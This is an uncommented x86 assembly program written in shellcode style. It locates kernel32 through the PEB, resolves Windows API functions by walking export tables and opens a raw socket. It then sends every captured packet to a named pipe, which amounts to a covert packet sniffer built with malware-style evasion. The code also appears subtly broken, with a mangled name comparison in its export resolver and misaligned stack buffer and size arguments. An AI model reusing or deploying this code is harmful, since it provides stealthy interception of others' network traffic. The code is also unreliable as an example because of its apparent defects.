section .data
    pipe_path db '\\.\pipe\r_stream', 0
    
    h_kernel32 db 'kernel32.dll', 0
    h_ws2_32   db 'ws2_32.dll', 0

    h_CreateFileA db 'CreateFileA', 0
    h_WriteFile   db 'WriteFile', 0
    h_ExitProcess db 'ExitProcess', 0
    h_LoadLibraryA db 'LoadLibraryA', 0

    h_WSAStartup db 'WSAStartup', 0
    h_socket     db 'socket', 0
    h_recvfrom   db 'recvfrom', 0

section .text
global _start

_start:
    xor edx, edx
    mov edx, [fs:edx + 0x30]
    mov edx, [edx + 0x0C]
    mov edx, [edx + 0x1C]
init_loop:
    mov eax, [edx + 0x08]
    mov esi, [edx + 0x20]
    mov edx, [edx]
    cmp byte [esi + 12], 0
    jne init_loop
    mov [kernel32_base], eax

    mov ecx, h_LoadLibraryA
    mov ebp, [kernel32_base]
    call get_proc_address
    mov [p_LoadLibraryA], eax

    mov ecx, h_CreateFileA
    mov ebp, [kernel32_base]
    call get_proc_address
    mov [p_CreateFileA], eax

    mov ecx, h_WriteFile
    mov ebp, [kernel32_base]
    call get_proc_address
    mov [p_WriteFile], eax

    mov ecx, h_ExitProcess
    mov ebp, [kernel32_base]
    call get_proc_address
    mov [p_ExitProcess], eax

    push h_ws2_32
    call [p_LoadLibraryA]
    mov [ws2_32_base], eax

    mov ecx, h_WSAStartup
    mov ebp, [ws2_32_base]
    call get_proc_address
    mov [p_WSAStartup], eax

    mov ecx, h_socket
    mov ebp, [ws2_32_base]
    call get_proc_address
    mov [p_socket], eax

    mov ecx, h_recvfrom
    mov ebp, [ws2_32_base]
    call get_proc_address
    mov [p_recvfrom], eax

    sub esp, 400
    push esp
    push 0x0202
    call [p_WSAStartup]
    add esp, 400

    push 3
    push 3
    push 2
    call [p_socket]
    mov [sock_handle], eax
    cmp eax, -1
    je exit_error

    push 0
    push 80
    push 3
    push 0
    push 1
    push 0xC0000000
    push pipe_path
    call [p_CreateFileA]
    mov [pipe_handle], eax
    cmp eax, -1
    je exit_error

    sub esp, 2048
capture_loop:
    push 0
    push 0
    push 0
    push 2048
    push esp
    push dword [sock_handle]
    call [p_recvfrom]
    test eax, eax
    jle capture_loop
    mov [pkt_size], eax

    push 0
    push bytes_written
    push 8
    push pkt_size
    push dword [pipe_handle]
    call [p_WriteFile]

    push 0
    push bytes_written
    push dword [pkt_size]
    push esp
    push dword [pipe_handle]
    call [p_WriteFile]
    jmp capture_loop

exit_error:
    push 1
    call [p_ExitProcess]

get_proc_address:
    mov eax, [ebp + 0x3C]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_func_loop:
    dec ecx
    js func_not_found
    mov esi, [ebx + ecx * 4]
    add esi, ebp
    mov edi, ecx
compare_name:
    cmpsb
    jne find_func_loop
    cmp byte [esi-1], 0
    jne compare_name
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + ecx * 2]
    mov ebx, [edx + 0x1C]
    add ebx, ebp
    mov eax, [ebx + ecx * 4]
    add eax, ebp
    ret
func_not_found:
    xor eax, eax
    ret

section .bss
    kernel32_base resd 1
    ws2_32_base   resd 1
    
    p_LoadLibraryA resd 1
    p_CreateFileA  resd 1
    p_WriteFile    resd 1
    p_ExitProcess  resd 1
    
    p_WSAStartup   resd 1
    p_socket       resd 1
    p_recvfrom     resd 1

    sock_handle   resd 1
    pipe_handle   resd 1
    pkt_size      resd 1
    bytes_written resd 1
